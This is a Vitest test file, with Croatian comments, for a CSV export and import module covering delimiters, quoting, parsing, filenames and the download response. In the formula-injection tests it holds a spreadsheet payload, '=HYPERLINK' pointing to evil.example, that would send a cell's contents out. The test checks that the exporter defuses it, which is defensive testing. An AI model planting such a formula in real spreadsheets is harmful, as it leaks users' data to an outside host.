import { describe, expect, it } from "vitest";
import {
  CSV_BOM,
  csvDate,
  csvFilename,
  csvPreamble,
  csvResponse,
  delimiterFor,
  detectDelimiter,
  exportFilename,
  parseCsv,
  readCsv,
  slugify,
  stripBom,
  toCsv,
} from "./csv";

// BOM + sep= redak; testovi ispod gledaju samo ono što dolazi iza njega.
const P = (d: string) => csvPreamble(d);

describe("delimiterFor", () => {
  it("hr dobiva ';' jer mu je zarez decimalni znak", () => {
    expect(delimiterFor("hr")).toBe(";");
  });

  it("en dobiva ','", () => {
    expect(delimiterFor("en")).toBe(",");
  });
});

describe("csvPreamble", () => {
  it("BOM pa sep= redak s tim razdjelnikom", () => {
    expect(CSV_BOM).toBe("﻿");
    expect(csvPreamble(";")).toBe(`${CSV_BOM}sep=;\r\n`);
    expect(csvPreamble(",")).toBe(`${CSV_BOM}sep=,\r\n`);
  });

  it("sep= prati razdjelnik koji datoteka stvarno koristi", () => {
    for (const d of [";", ","]) {
      const [, sep] = toCsv([["a", "b"]], d).split("\r\n");
      expect(toCsv([["a", "b"]], d).split("\r\n")[0]).toBe(`${CSV_BOM}sep=${d}`);
      expect(sep).toBe(`a${d}b`);
    }
  });
});

describe("toCsv", () => {
  it("počinje BOM-om i sep= retkom", () => {
    expect(toCsv([["a"]], ";").startsWith(`${CSV_BOM}sep=;\r\n`)).toBe(true);
  });

  it("retke razdvaja CRLF-om, polja razdjelnikom", () => {
    expect(toCsv([["a", "b"], ["c", "d"]], ";")).toBe(`${P(";")}a;b\r\nc;d`);
  });

  it("ne navodi polja koja to ne trebaju", () => {
    expect(toCsv([["Ana", "Horvat"]], ";")).toBe(`${P(";")}Ana;Horvat`);
  });

  it("navodi polje koje sadrži razdjelnik", () => {
    expect(toCsv([["Horvat; Ana"]], ";")).toBe(`${P(";")}"Horvat; Ana"`);
  });

  it("zarez se navodi samo kad je zarez razdjelnik", () => {
    expect(toCsv([["Horvat, Ana"]], ";")).toBe(`${P(";")}Horvat, Ana`);
    expect(toCsv([["Horvat, Ana"]], ",")).toBe(`${P(",")}"Horvat, Ana"`);
  });

  it("udvostručuje navodnik i navodi polje", () => {
    expect(toCsv([['Ana "Anči" Horvat']], ";")).toBe(
      `${P(";")}"Ana ""Anči"" Horvat"`,
    );
  });

  it("navodi polje s razdjelnikom I navodnikom odjednom", () => {
    expect(toCsv([['a;b"c']], ";")).toBe(`${P(";")}"a;b""c"`);
  });

  it("navodi polje s novim redom", () => {
    expect(toCsv([["prvi\ndrugi"]], ";")).toBe(`${P(";")}"prvi\ndrugi"`);
  });

  it("prazna polja ostaju prazna", () => {
    expect(toCsv([["", "", "a"]], ";")).toBe(`${P(";")};;a`);
  });
});

describe("toCsv — formule", () => {
  // Bez ovoga tablični program izvrši ćeliju koju je napisao administrator.
  it("označava tekstom svaki okidač formule", () => {
    for (const v of ["=1+1", "+1", "-1", "@SUM(A1)"]) {
      expect(toCsv([[v]], ";")).toBe(`${P(";")}'${v}`);
    }
  });

  it("TAB i CR su okidači jednako kao = + - @", () => {
    expect(toCsv([["\tX"]], ";")).toBe(`${P(";")}'\tX`);
    // CR povlači i navodnike, ali oni sami ne bi zaustavili izvršavanje.
    expect(toCsv([["\rX"]], ";")).toBe(`${P(";")}"'\rX"`);
  });

  it("okidač usred teksta nije okidač", () => {
    expect(toCsv([["Ana=Ana", "1+1", "a@b.hr"]], ";")).toBe(
      `${P(";")}Ana=Ana;1+1;a@b.hr`,
    );
  });

  it("HYPERLINK napad iz sigurnosnog pregleda izlazi kao tekst", () => {
    const attack = '=HYPERLINK("https://evil.example/?d="&A1,"Rezultati")';
    const body = toCsv([[attack]], ";").slice(P(";").length);
    expect(body.startsWith("\"'=")).toBe(true);
  });

  it("prazna ćelija i sam apostrof prolaze netaknuti", () => {
    expect(toCsv([["", "'"]], ";")).toBe(`${P(";")};'`);
  });
});

describe("csvDate", () => {
  it("daje ISO datum bez vremena", () => {
    expect(csvDate(new Date("2026-07-25T22:13:00.000Z"))).toBe("2026-07-25");
  });
});

describe("slugify", () => {
  it("makne hrvatske dijakritike", () => {
    expect(slugify("Izbori za Studentski zbor")).toBe(
      "izbori-za-studentski-zbor",
    );
    expect(slugify("Čačić Šešelj Žuti Ćiro")).toBe("cacic-seselj-zuti-ciro");
  });

  it("rastavlja đ koje NFD ne dira", () => {
    expect(slugify("Đakovo đir")).toBe("dakovo-dir");
  });

  it("makne kose crte i navodnike iz naslova", () => {
    expect(slugify('Izbori "2026" / drugi krug')).toBe(
      "izbori-2026-drugi-krug",
    );
  });

  it("nema vodećih ni završnih crtica", () => {
    expect(slugify("  ...Izbori!  ")).toBe("izbori");
  });

  it("naslov od same interpunkcije daje prazan slug", () => {
    expect(slugify("///")).toBe("");
  });

  it("reže dugačke naslove na 60 znakova", () => {
    expect(slugify("a".repeat(120))).toHaveLength(60);
  });
});

describe("csvFilename", () => {
  const date = new Date("2026-07-25T10:00:00.000Z");

  it("spaja slug, sufiks i datum", () => {
    expect(csvFilename("Izbori za Studentski zbor", "biraci", date)).toBe(
      "izbori-za-studentski-zbor-biraci-2026-07-25.csv",
    );
  });

  it("prazan slug pada na 'export' umjesto na vodeću crticu", () => {
    expect(csvFilename("///", "biraci", date)).toBe(
      "export-biraci-2026-07-25.csv",
    );
  });
});

// Ime bez nastavka koristi PDF izvještaj: preglednik ga preuzima iz naslova
// stranice i predlaže kao ime pri spremanju u PDF.
describe("exportFilename", () => {
  const date = new Date("2026-07-25T10:00:00.000Z");

  it("ne dodaje nastavak", () => {
    expect(exportFilename("Izbori za Studentski zbor", "izvjestaj", date)).toBe(
      "izbori-za-studentski-zbor-izvjestaj-2026-07-25",
    );
  });

  it("csvFilename je isto ime + .csv — jedan slugifier, ne dva", () => {
    const title = "Izbori 2026 — Đakovo / Osijek";
    expect(csvFilename(title, "biraci", date)).toBe(
      `${exportFilename(title, "biraci", date)}.csv`,
    );
  });
});

describe("stripBom", () => {
  it("makne BOM samo s početka", () => {
    expect(stripBom(`${CSV_BOM}Ime`)).toBe("Ime");
    expect(stripBom("Ime")).toBe("Ime");
    expect(stripBom(`Ime${CSV_BOM}`)).toBe(`Ime${CSV_BOM}`);
  });
});

describe("detectDelimiter", () => {
  it("bira onaj kojeg u prvom retku ima više", () => {
    expect(detectDelimiter("Ime;Prezime;E-mail")).toBe(";");
    expect(detectDelimiter("name,email")).toBe(",");
  });

  it("ne broji razdjelnike unutar navodnika", () => {
    expect(detectDelimiter('"Horvat; Ana; ml.",a@b.hr')).toBe(",");
  });

  it("jedan stupac ili neriješeno pada na zarez", () => {
    expect(detectDelimiter("Ime")).toBe(",");
    expect(detectDelimiter("a;b,c")).toBe(",");
  });

  it("preskače prazne retke na početku", () => {
    expect(detectDelimiter("\n\nIme;E-mail")).toBe(";");
  });
});

describe("parseCsv", () => {
  it("dijeli obična polja i retke", () => {
    expect(parseCsv("a,b\nc,d", ",")).toEqual([
      ["a", "b"],
      ["c", "d"],
    ]);
  });

  it("navedeno polje smije sadržavati razdjelnik", () => {
    expect(parseCsv('"Kovačević, Ana",ana@unizg.hr', ",")).toEqual([
      ["Kovačević, Ana", "ana@unizg.hr"],
    ]);
  });

  it("udvostručeni navodnik je jedan doslovni znak", () => {
    expect(parseCsv('"Ana ""Anči"" Horvat",x', ",")).toEqual([
      ['Ana "Anči" Horvat', "x"],
    ]);
  });

  it("navedeno polje smije sadržavati novi red", () => {
    expect(parseCsv('"prvi\ndrugi",x\nAna,y', ",")).toEqual([
      ["prvi\ndrugi", "x"],
      ["Ana", "y"],
    ]);
  });

  it("navodnik usred teksta je slovo, ne otvaranje polja", () => {
    expect(parseCsv('Ivo "Ivica,i@b.hr', ",")).toEqual([
      ['Ivo "Ivica', "i@b.hr"],
    ]);
  });

  it("nezatvoren navodnik ruši samo svoj red, ostatak prolazi", () => {
    expect(parseCsv('Ana,a@b.hr\n"Ivo,i@b.hr\nMara,m@b.hr', ",")).toEqual([
      ["Ana", "a@b.hr"],
      ["Ivo,i@b.hr"],
      ["Mara", "m@b.hr"],
    ]);
  });

  it("prazna polja i CRLF ostaju ispravni", () => {
    expect(parseCsv('a,,c\r\n"",x', ",")).toEqual([
      ["a", "", "c"],
      ["", "x"],
    ]);
  });

  it("prazni retci otpadaju", () => {
    expect(parseCsv("a,b\n\n\nc,d\n", ",")).toEqual([
      ["a", "b"],
      ["c", "d"],
    ]);
  });

  it("radi jednako s točkazarezom", () => {
    expect(parseCsv('"Horvat; Ana";a@b.hr', ";")).toEqual([
      ["Horvat; Ana", "a@b.hr"],
    ]);
  });
});

describe("readCsv", () => {
  it("pojede BOM i sep= redak i uzme taj razdjelnik", () => {
    expect(readCsv(`${CSV_BOM}sep=;\r\nIme;E-mail\r\nAna;a@b.hr`)).toEqual([
      ["Ime", "E-mail"],
      ["Ana", "a@b.hr"],
    ]);
  });

  it("bez sep= retka sam otkrije razdjelnik", () => {
    expect(readCsv("Ime;E-mail\nAna;a@b.hr")).toEqual([
      ["Ime", "E-mail"],
      ["Ana", "a@b.hr"],
    ]);
  });

  // Najvažniji test u datoteci: zapisivač i čitač moraju biti inverzi.
  it("vraća točno ono što je toCsv zapisao", () => {
    const rows = [
      ["Ime", "Prezime", "E-mail"],
      ["Kovačević, Ana", 'Ana ""', "ana@unizg.hr"],
      ["prvi\ndrugi", "", "b@c.hr"],
      // Oznaka teksta ispred formule mora se skinuti pri čitanju, inače se
      // vlastiti izvoz ne može ponovno uvesti u čarobnjak.
      ["=Ana", "-Horvat", "@b.hr"],
      ["\tX", "'", "1+1"],
    ];
    for (const d of [";", ","]) {
      expect(readCsv(toCsv(rows, d))).toEqual(rows);
    }
  });

  it("miče oznaku teksta samo ispred okidača formule", () => {
    expect(readCsv("'=Ana;'-1;'Ante;a'b")).toEqual([
      ["=Ana", "-1", "'Ante", "a'b"],
    ]);
  });
});

describe("csvResponse", () => {
  it("postavlja zaglavlja za preuzimanje i zabranjuje keširanje", () => {
    const res = csvResponse("a;b", "popis-2026-07-25.csv");
    expect(res.headers.get("content-type")).toBe("text/csv; charset=utf-8");
    expect(res.headers.get("content-disposition")).toBe(
      'attachment; filename="popis-2026-07-25.csv"',
    );
    expect(res.headers.get("cache-control")).toBe("no-store");
  });
});
